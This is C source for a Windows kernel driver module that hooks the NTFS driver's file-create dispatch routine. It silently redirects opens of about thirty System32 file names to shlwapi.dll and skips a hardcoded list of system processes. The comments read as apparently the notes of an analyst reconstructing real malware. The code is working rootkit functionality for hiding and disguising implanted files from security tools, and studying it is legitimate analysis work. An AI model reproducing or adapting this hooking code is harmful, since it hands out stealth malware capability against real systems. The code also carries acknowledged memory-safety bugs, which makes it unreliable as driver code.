#include "FileSystem.h"
#include "Debug.h"

NTKERNELAPI PCHAR PsGetProcessImageFileName(PEPROCESS Process);

extern POBJECT_TYPE* IoDriverObjectType;

typedef NTSTATUS(NTAPI* ptr_ObReferenceObjectByName)(
	PUNICODE_STRING ObjectName,
	ULONG Attributes,
	PACCESS_STATE AccessState,
	ACCESS_MASK DesiredAccess,
	POBJECT_TYPE ObjectType,
	KPROCESSOR_MODE AccessMode,
	PVOID ParseContext OPTIONAL,
	PVOID* Object
	);

struct {
	PCHAR Min;
	ULONG Size;
} FsForbiddenRange;

#define IGNORED_PROCESS_LIST_LENGTH 64

CHAR g_FsDynamicIgnoredProcessesList[IGNORED_PROCESS_LIST_LENGTH][IGNORED_PROCESS_NAME_LENGTH];

CHAR g_FsHardcodedIgnoredProcessList[][32] = { 
	"winlogon.exe",
	"csrss.exe",
	"services.exe",
	"lsass.exe",
	"svchost.exe",
	"wininit.exe",
	"smss.exe",
	"dllhost.exe",
	"rundll32.exe",
	"explorer.exe",
	"wmiapsrv.exe",
	"cacls.exe",
	"free.exe"
};

PDRIVER_DISPATCH g_FsOriginalCreateFileDispatcher;


static NTSTATUS FsCreateFileHook(PDEVICE_OBJECT DeviceObject, PIRP Irp);
static NTSTATUS FsGetRedirectionTarget(PCWSTR FileName, PWSTR OutputRedirectedFile);

PFILE_REDIRECTION_ENTRY g_FsProtectedFilesListHead;
PFILE_REDIRECTION_ENTRY g_FsProtectedFilesListTail;


FORCEINLINE BOOLEAN IsBetween(PCHAR a, PCHAR min, ULONG size)
{
	return (a > min && a < (min + size));
}

//
// Typically fltmgr.sys 
// It could be another device if someone called IoAttachDevice 
//
FORCEINLINE PDRIVER_OBJECT FsGetDriverToHook(PDRIVER_OBJECT FileSystemDriverObject)
{
	PDEVICE_OBJECT FileSystemDevice = FileSystemDriverObject->DeviceObject;

	if (!MmIsAddressValid(FileSystemDevice))
	{
		return NULL;
	}

	if (FileSystemDevice->AttachedDevice)
	{
		if (!MmIsAddressValid(FileSystemDevice->AttachedDevice))
		{
			return NULL;
		}

		return FileSystemDevice->AttachedDevice->DriverObject;
	}
	else
	{
		return FileSystemDriverObject;
	}

}

static NTSTATUS FsPutRedirectorHook(BOOLEAN IsRemove, PUNICODE_STRING DriverObjectName, ptr_ObReferenceObjectByName ObReferenceObjectByNamePtr)
{
	PDRIVER_OBJECT FileSystemDriver;
	PDRIVER_OBJECT HookDriverObject;
	NTSTATUS Status;

	Status = ObReferenceObjectByNamePtr(
		DriverObjectName, 
		OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, 
		NULL, 
		0, 
		*IoDriverObjectType, 
		KernelMode, 
		NULL,
		&FileSystemDriver
		);

	if (!NT_SUCCESS(Status))
		return Status;

	HookDriverObject = FsGetDriverToHook(FileSystemDriver);
	
	if (HookDriverObject == NULL)
	{
		Status = STATUS_SUCCESS;
		goto clean;
	}

	if (IsRemove)
	{
		if (IsBetween((PCHAR)HookDriverObject->MajorFunction[IRP_MJ_CREATE], FsForbiddenRange.Min, FsForbiddenRange.Size))
		{
			Status = STATUS_UNSUCCESSFUL;
			goto clean;
		}

		g_FsOriginalCreateFileDispatcher = HookDriverObject->MajorFunction[IRP_MJ_CREATE];
		HookDriverObject->MajorFunction[IRP_MJ_CREATE] = FsCreateFileHook;
	}
	else
	{
		HookDriverObject->MajorFunction[IRP_MJ_CREATE] = g_FsOriginalCreateFileDispatcher;
	}


clean:
	ObDereferenceObject(FileSystemDriver);
	return Status;
}


NTSTATUS FsInitializeFileRedirection()
{
	D_INFO("Initializnig File System Redirection Module");

	UNICODE_STRING NtfsDriver = RTL_CONSTANT_STRING(L"\\FileSystem\\Ntfs");

	FsAddFileRedirection(L"\\WINDOWS\\System32\\DRIVERS\\autochk.sys", L"\\WINDOWS\\System32\\DRIVERS\\fltMgr.sys");

	PCWSTR shlapi = L"\\Windows\\System32\\shlwapi.dll";
	
	// wtf dude
	FsAddFileRedirection(L"\\Windows\\System32\\odbcwg32.cpl", shlapi);
	FsAddFileRedirection(L"\\Windows\\System32\\c_21268.nls", shlapi);
	FsAddFileRedirection(L"\\Windows\\System32\\cliconfg.cpl", shlapi);
	FsAddFileRedirection(L"\\Windows\\System32\\imekr61.dll", shlapi);
	FsAddFileRedirection(L"\\Windows\\System32\\PINTLGNT.dll", shlapi);
	FsAddFileRedirection(L"\\Windows\\System32\\chrsben.ime", shlapi);
	FsAddFileRedirection(L"\\Windows\\System32\\bitsprx.ime", shlapi);
	FsAddFileRedirection(L"\\Windows\\System32\\C_1950.NLS", shlapi);
	FsAddFileRedirection(L"\\Windows\\System32\\C_26849.NLS", shlapi);
	FsAddFileRedirection(L"\\Windows\\System32\\chrsben.dll", shlapi);
	FsAddFileRedirection(L"\\Windows\\System32\\mfc100usx.dll", shlapi);
	FsAddFileRedirection(L"\\Windows\\System32\\wlanseo.dll", shlapi);
	FsAddFileRedirection(L"\\Windows\\System32\\KBDDWSKY.DLL", shlapi);
	FsAddFileRedirection(L"\\Windows\\System32\\imseo21.ime", shlapi);
	FsAddFileRedirection(L"\\Windows\\System32\\midiapi.dll", shlapi);
	FsAddFileRedirection(L"\\Windows\\System32\\mfc120du.dll", shlapi);
	FsAddFileRedirection(L"\\Windows\\System32\\wbem\\loadperf.dll", shlapi);
	FsAddFileRedirection(L"\\Windows\\System32\\audiosrc.dll", shlapi);
	FsAddFileRedirection(L"\\Windows\\System32\\bootred.dll", shlapi);
	FsAddFileRedirection(L"\\Windows\\System32\\cryptdns.dll", shlapi);
	FsAddFileRedirection(L"\\Windows\\System32\\cryptbios.dll", shlapi);
	FsAddFileRedirection(L"\\Windows\\System32\\dhcpcsvcd.dll", shlapi);
	FsAddFileRedirection(L"\\Windows\\System32\\iscsiapi.dll", shlapi);
	FsAddFileRedirection(L"\\Windows\\System32\\keyzip.dll", shlapi);
	FsAddFileRedirection(L"\\Windows\\System32\\odbccx32.dll", shlapi);
	FsAddFileRedirection(L"\\Windows\\System32\\samlib32.dll", shlapi);
	FsAddFileRedirection(L"\\Windows\\System32\\sqlnclc11.dll", shlapi);
	FsAddFileRedirection(L"\\Windows\\System32\\shlzapi.dll", shlapi);
	FsAddFileRedirection(L"\\Windows\\System32\\shlyapi.dll", shlapi);
	FsAddFileRedirection(L"\\Windows\\System32\\prnfsdk.dll", shlapi);
	FsAddFileRedirection(L"\\Windows\\System32\\AudioSdk.dll", shlapi);
	FsAddFileRedirection(L"\\Windows\\System32\\stdole32.dll", shlapi);

	UNICODE_STRING ObReferenceObjectByName_String = RTL_CONSTANT_STRING(L"ObReferenceObjectByName");
	ptr_ObReferenceObjectByName ObReferenceObjectByNamePtr = (ptr_ObReferenceObjectByName)MmGetSystemRoutineAddress(&ObReferenceObjectByName_String);

	if (!ObReferenceObjectByNamePtr)
		return STATUS_UNSUCCESSFUL;

	return FsPutRedirectorHook(TRUE, &NtfsDriver, ObReferenceObjectByNamePtr);
}


NTSTATUS FsAddFileRedirection(PCWSTR SourceFile, PCWSTR TargetFile)
{
	PFILE_REDIRECTION_ENTRY Entry = g_FsProtectedFilesListHead;

	while (Entry != NULL)
	{
		if (!_wcsicmp(SourceFile, Entry->SourceFilePath) && 
			!_wcsicmp(TargetFile, Entry->TargetFilePath))
		{
			return STATUS_SUCCESS;	
		}

		Entry = Entry->NextEntry;
	}

	Entry = (PFILE_REDIRECTION_ENTRY)ExAllocatePool(NonPagedPool, sizeof(FILE_REDIRECTION_ENTRY));
	
	if (!Entry)
	{
		D_ERROR("ExAllocatePool Failed: Could not allocate FILE_REDIRECTION_ENTRY");
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	wcscpy(Entry->SourceFilePath, SourceFile);
	wcscpy(Entry->TargetFilePath, TargetFile);

	if (!g_FsProtectedFilesListHead)
	{
		g_FsProtectedFilesListHead = Entry;
	}
	else
	{
		g_FsProtectedFilesListTail->NextEntry = Entry;
	}

	Entry->NextEntry = NULL;
	g_FsProtectedFilesListTail = Entry;
	return STATUS_SUCCESS;

}

NTSTATUS FsAddIgnoredProcess(PCSTR IgnoredProcessName)
{
	//
	// Verify that this process does not exist in the list
	//
	for (ULONG i = 0; i < 64; i++)
	{
		PSTR CurrentName = g_FsDynamicIgnoredProcessesList[i];

		if (CurrentName[0] == 0 && !strcmp(IgnoredProcessName, CurrentName))
		{
			D_INFO_ARGS("Process %s is already ignored.", IgnoredProcessName);
			return STATUS_SUCCESS;
		}
	}


	//
	// Find the first empty entry and insert this process
	//
	for (ULONG i = 0; i < 64; i++)
	{
		PSTR CurrentName = g_FsDynamicIgnoredProcessesList[i];

		if (CurrentName[0] == 0)
		{
			// ERR: A null terminator is missing from the end of the list.	
			// This cannot be exploited because the padding in the binary.
			RtlCopyMemory(CurrentName, IgnoredProcessName, IGNORED_PROCESS_NAME_LENGTH);
			D_INFO_ARGS("Process %.*s is ignored!", IGNORED_PROCESS_NAME_LENGTH, CurrentName);
			return STATUS_SUCCESS;
		}
	}

	D_INFO("Could not add process to the ignored process list. List is full");
	return STATUS_UNSUCCESSFUL;
}

//
// This is the actual hook. This hook redirects files on the file system.
// This means that if you open a handle to a redirected file, you'll receive a handle 
// to a different file because the file name in the IRP was changed in the hook.
//
static NTSTATUS FsCreateFileHook(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	WCHAR RedirectionTarget[260];
	PIO_STACK_LOCATION IoStackLocation = IoGetCurrentIrpStackLocation(Irp);
	PUNICODE_STRING FileObjectName;

	//
	// Verify values aren't NULL and this is the correct IRQL
	//
	if (
		(IoStackLocation == NULL) || 
		(IoStackLocation->FileObject == NULL) || 
		(KeGetCurrentIrql() != PASSIVE_LEVEL)
	)
	{
		goto exit;
	}

	FileObjectName = &IoStackLocation->FileObject->FileName;

	RtlZeroMemory(RedirectionTarget, 520);
	
	//
	// ERR: UNICODE_STRINGs aren't always null terminated. (FileObjectName->Buffer)
	//
	if (FsGetRedirectionTarget(FileObjectName->Buffer, RedirectionTarget) != STATUS_SUCCESS)
	{
		goto exit;
	}
	
	//
	// Look if this process should be ignored
	//
	PCHAR ProcessName = PsGetProcessImageFileName(PsGetCurrentProcess());

	for (ULONG i = 0; i < 13; i++)
	{
		if (!_stricmp(ProcessName, g_FsHardcodedIgnoredProcessList[i]))
		{
			goto exit;
		}
	}

	for (ULONG i = 0; i < 64; i++)
	{
		if (!_stricmp(ProcessName, g_FsDynamicIgnoredProcessesList[i]))
		{
			goto exit;
		}
	}

	D_INFO_ARGS("Redirecting file %wZ", FileObjectName);

	ULONG TargetNameLength = (ULONG)wcslen(RedirectionTarget);
	ULONG ExistingFileNameCapacity = (FileObjectName->MaximumLength / 2);

	if (ExistingFileNameCapacity <= TargetNameLength)
	{
		// 
		// ERR: Where is it freed?
		// Maybe it's automatically freed by the IO manager..
		//
		PVOID NewFileName = ExAllocatePoolWithTag(NonPagedPool, 520, 'pf');

		if (!NewFileName)
		{
			goto exit;
		}

		RtlZeroMemory(NewFileName, 520);
		
		RtlMoveMemory(NewFileName, RedirectionTarget, TargetNameLength);

		FileObjectName->Buffer = NewFileName;
		FileObjectName->MaximumLength = 520;
		FileObjectName->Length = (USHORT) (wcslen(NewFileName) * 2);
	}
	else
	{
		RtlZeroMemory(FileObjectName->Buffer, FileObjectName->MaximumLength);
		RtlMoveMemory(FileObjectName->Buffer, RedirectionTarget, TargetNameLength * 2);
		FileObjectName->Length = (USHORT)(TargetNameLength * 2);
	}

exit:
	return g_FsOriginalCreateFileDispatcher(DeviceObject, Irp);
}

static NTSTATUS FsGetRedirectionTarget(PCWSTR FileName, PWSTR OutputRedirectedFile)
{
	__try
	{
		PFILE_REDIRECTION_ENTRY Entry = g_FsProtectedFilesListHead;

		while (Entry != NULL)
		{
			if (!_wcsicmp(FileName, Entry->SourceFilePath))
			{
				RtlMoveMemory(OutputRedirectedFile, Entry->TargetFilePath, wcslen(Entry->TargetFilePath) * 2);
				return STATUS_SUCCESS;
			}

			Entry = Entry->NextEntry;
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER) 
	{ 
		// This will typically occur in case the FileName in the IRP is null.
		// (They could just add a check to see if the FileName is null)
	}

	return STATUS_UNSUCCESSFUL;
	
}

VOID FsFreeFileRedirection()
{
	if (!MmIsAddressValid((PVOID)g_FsOriginalCreateFileDispatcher))
	{
		return;
	}

	UNICODE_STRING NtfsDriver = RTL_CONSTANT_STRING(L"\\FileSystem\\Ntfs");
	UNICODE_STRING ObReferenceObjectByNameString = RTL_CONSTANT_STRING(L"ObReferenceObjectByName");

	ptr_ObReferenceObjectByName pObReferenceObjectByName = (ptr_ObReferenceObjectByName)MmGetSystemRoutineAddress(&ObReferenceObjectByNameString);

	if (pObReferenceObjectByName)
	{
		FsPutRedirectorHook(FALSE, &NtfsDriver, pObReferenceObjectByName);
	}

	// Free ProtectedFilesList entries
	while (g_FsProtectedFilesListHead != NULL)
	{
		PFILE_REDIRECTION_ENTRY TempNext = g_FsProtectedFilesListHead->NextEntry;

		ExFreePool(g_FsProtectedFilesListHead);

		g_FsProtectedFilesListHead = TempNext;
	}

	// This line is not necessary..
	g_FsProtectedFilesListHead = NULL;
	g_FsProtectedFilesListTail = NULL;
}